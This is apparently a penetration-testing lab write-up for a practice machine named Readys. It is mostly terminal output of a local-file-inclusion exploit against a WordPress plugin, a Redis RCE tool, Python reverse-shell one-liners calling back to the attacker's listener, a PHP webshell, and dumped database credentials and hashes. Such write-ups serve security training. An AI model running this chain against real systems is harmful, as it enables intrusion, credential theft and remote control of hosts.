# Readys

# Enumeration
Has port 80 webserver open (can be obtained from nmap)
Run wpscan, which reveals this

![](Pasted%20image%2020220320164325.png)

Can google

# Exploitation

https://www.exploit-db.com/exploits/44340
```
┌──(root💀DESKTOP-61F9HO2)-[~/autorecon]                                                
└─# curl  http://192.168.74.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd                          root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                    sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                    sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                         lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                            mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                           irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                        gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin       nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin                                        systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin            messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin                                           systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin                      mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false                                 redis:x:107:114::/var/lib/redis:/usr/sbin/nologin                                       alice:x:1000:1000::/home/alice:/bin/bash                                                {"success":true,"data":{"output":[]}}
└─# curl  http://192.168.74.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/home/alice/local.txt
298c32e40e900967cec3317db8aa235f
{"success":true,"data":{"output":[]}}┌──(root💀DESKTOP-61F9HO2)-[~/autorecon]
└─# curl  http://192.168.74.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis/redis.conf | grep pass
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                          Dload  Upload   Total   Spent    Left  Speed             
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
# 2) No password is configured.                                                                   
# If the master is password protected (using the "requirepass" configuration            
# masterauth <master-password>                                                          
# resync is enough, just passing the portion of data the replica missed while
# 150k passwords per second against a good box. This means that you should              
# use a very strong password otherwise it will be very easy to break.
requirepass Ready4Redis?
100 61899    0 61899    0     0  89377      0 --:--:-- --:--:-- --:--:-- 89320          
┌──(root💀DESKTOP-61F9HO2)-[~/autorecon]
└─#
```

Redis RCE

```
┌──(root💀DESKTOP-61F9HO2)-[/tmp/redis-rce]
└─# python redis-rce.py -r 192.168.74.166 -L 192.168.49.74 -P 6379 -f ../RedisModules-ExecuteCommand/module.so -a Ready4Redis?

█▄▄▄▄ ▄███▄   ██▄   ▄█    ▄▄▄▄▄       █▄▄▄▄ ▄█▄    ▄███▄
█  ▄▀ █▀   ▀  █  █  ██   █     ▀▄     █  ▄▀ █▀ ▀▄  █▀   ▀                               █▀▀▌  ██▄▄    █   █ ██ ▄  ▀▀▀▀▄       █▀▀▌  █   ▀  ██▄▄
█  █  █▄   ▄▀ █  █  ▐█  ▀▄▄▄▄▀        █  █  █▄  ▄▀ █▄   ▄▀
  █   ▀███▀   ███▀   ▐                  █   ▀███▀  ▀███▀                                 ▀                                     ▀                                                

[*] Connecting to  192.168.74.166:6379...
[*] Sending SLAVEOF command to server
[+] Accepted connection from 192.168.74.166:6379
[*] Setting filename
[+] Accepted connection from 192.168.74.166:6379
[*] Start listening on 192.168.49.74:6379                                               [*] Tring to run payload
[+] Accepted connection from 192.168.74.166:36363                                       [*] Closing rogue server...                                                             
[+] What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: i                [+] Interactive shell open , use "exit" to exit...                                      $ whoami                                                                                0                                                                                       8                                                                                       9redis
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192. 168.49.74",6379));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' 
```

```
^C┌──(root💀DESKTOP-61F9HO2)-[~/autorecon/results/192.168.69.166/scans]                 └─# nc -nlvp 6379
Listening on 0.0.0.0 6379                                                               Connection received on 192.168.74.166 34474                                             redis@readys:~$ pwd                                                                     pwd                                                                                     /var/lib/redis
redis@readys:~$ cd /home/alice
cd /home/alice                                                                          bash: cd: /home/alice: Permission denied                                                redis@readys:~$ cat /home/alice/local.txt                                               cat /home/alice/local.txt
cat: /home/alice/local.txt: Permission denied
redis@readys:~$ 
```

Wordpress DB dump

```
redis@readys:/var/www/html$ ls
ls
index.php        wp-blog-header.php    wp-cron.php        wp-mail.php
license.txt      wp-comments-post.php  wp-includes        wp-settings.php
readme.html      wp-config.php         wp-links-opml.php  wp-signup.php                 wp-activate.php  wp-config-sample.php  wp-load.php        wp-trackback.php              wp-admin         wp-content            wp-login.php       xmlrpc.php                    redis@readys:/var/www/html$ cat wp-config.php | grep DB                                 cat wp-config.php | grep DB                                                             define( 'DB_NAME', 'wordpress' );                                                       define( 'DB_USER', 'karl' );                                                            define( 'DB_PASSWORD', 'Wordpress1234' );
define( 'DB_HOST', 'localhost' );                                                       define( 'DB_CHARSET', 'utf8mb4' );
define( 'DB_COLLATE', '' );                                                             redis@readys:/var/www/html$ touch webshell.php                                          touch webshell.php                                                                      touch: cannot touch 'webshell.php': Read-only file system                               redis@readys:/var/www/html$ 
```

```
redis@readys:/var/www/html$ mysql -ukarl -pWordpress1234
mysql -ukarl -pWordpress1234
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 38
Server version: 10.3.31-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
                                                                                        Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.          
MariaDB [(none)]> use wordpress;                                                        use wordpress;                                                                          Reading table information for completion of table and column names                      You can turn off this feature to get a quicker startup with -A                                                                                                                  Database changed
MariaDB [wordpress]> show tables;                                                       show tables;                                                                            +-----------------------+
| Tables_in_wordpress   |                                                               +-----------------------+                                                               | wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |                                                               | wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.000 sec)

MariaDB [wordpress]> select * from wp_users;
select * from wp_users;
+----+------------+------------------------------------+---------------+---------------+------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email    | user_url         | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------+------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$Ba5uoSB5xsqZ5GFIbBnOkXA0ahSJnb0 | admin         | test@test.com | http://localhost | 2021-07-11 16:35:27 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+---------------+------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.000 sec)

MariaDB [wordpress]> 
```

Cronjob
```
redis@readys:/var/www/html$ cat /etc/crontab                                            cat /etc/crontab                                                                        */3 * * * * root /usr/local/bin/backup.sh                                               redis@readys:/var/www/html$ ls -al /usr/local/bin/backup.sh
ls -al /usr/local/bin/backup.sh
-rwxr-xr-x 1 root root 122 Nov 17 12:36 /usr/local/bin/backup.sh                        redis@readys:/var/www/html$ cat /usr/local/bin/backup.sh                                cat /usr/local/bin/backup.sh
#!/bin/bash                                                                             
cd /var/www/html
if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
tar -cf /opt/backups/website.tar *
fi
redis@readys:/var/www/html$ cd /opt/backups                                             cd /opt/backups                                                                         bash: cd: /opt/backups: Permission denied                                               redis@readys:/var/www/html$ 
```

Webshell

```
redis@readys:/var/www/html$ cd /dev/shm                                                 cd /dev/shm                                                                             redis@readys:/dev/shm$ echo '<?php system($_REQUEST['c']) ?>' > webshell                echo '<?php system($_REQUEST['c']) ?>' > webshell
redis@readys:/dev/shm$ ls                                                               ls                                                                                      webshell                                                                                redis@readys:/dev/shm$ mv webshell w.php                                                mv webshell w.php                                                                       redis@readys:/dev/shm$
```

```
┌──(root💀DESKTOP-61F9HO2)-[~/autorecon]                                                └─# curl  "http://192.168.74.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/dev/shm/w.php&c=whoami"            alice                                                                                   {"success":true,"data":{"output":[]}}┌──(root💀DESKTOP-61F9HO2)-[~/autorecon]           └─└─# curl  "http://192.168.74.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/dev/shm/w.php&c=python%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.%20168.49.74%22,6379));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)'" 
```

```
┌──(root💀DESKTOP-61F9HO2)-[~/autorecon/results/192.168.69.166/scans]                   └─# nc -nlvp 6379                                                                       Listening on 0.0.0.0 6379                                                               Connection received on 192.168.74.166 55934                                             <ite-editor/editor/extensions/pagebuilder/includes$ cd ~                                cd ~                                                                                    alice@readys:/home/alice$ ls                                                            ls                                                                                      local.txt                                                                               alice@readys:/home/alice$ cat local.txt                                                 cat local.txt                                                                           30693de55f7fa68823ea7fb3ff943a3e                                                        alice@readys:/home/alice$ ifconfif                                                      ifconfif                                                                                bash: ifconfif: command not found                                                       alice@readys:/home/alice$ cat local.txt
cat local.txt                                                                           30693de55f7fa68823ea7fb3ff943a3e                                                        alice@readys:/home/alice$ ifconfig                                                      ifconfig                                                                                ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500                                    inet 192.168.74.166  netmask 255.255.255.0  broadcast 192.168.74.255                    inet6 fe80::250:56ff:feba:5e17  prefixlen 64  scopeid 0x20<link>                        ether 00:50:56:ba:5e:17  txqueuelen 1000  (Ethernet)                                    RX packets 370  bytes 119690 (116.8 KiB)                                                RX errors 0  dropped 0  overruns 0  frame 0                                             TX packets 755  bytes 106159 (103.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                                                                                                              lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536                                                    inet 127.0.0.1  netmask 255.0.0.0                                                       inet6 ::1  prefixlen 128  scopeid 0x10<host>                                            loop  txqueuelen 1000  (Local Loopback)                                                 RX packets 0  bytes 0 (0.0 B)                                                           RX errors 0  dropped 0  overruns 0  frame 0                                             TX packets 0  bytes 0 (0.0 B)                                                           TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
                                                                                        alice@readys:/home/alice$ mkdir .ssh                                                    mkdir .ssh                                                                              alice@readys:/home/alice$ cd .ssh                                                       cd .ssh                                                                                 alice@readys:/home/alice/.ssh$ 
```

![](Pasted%20image%2020220320164405.png)

# Privesc

# Others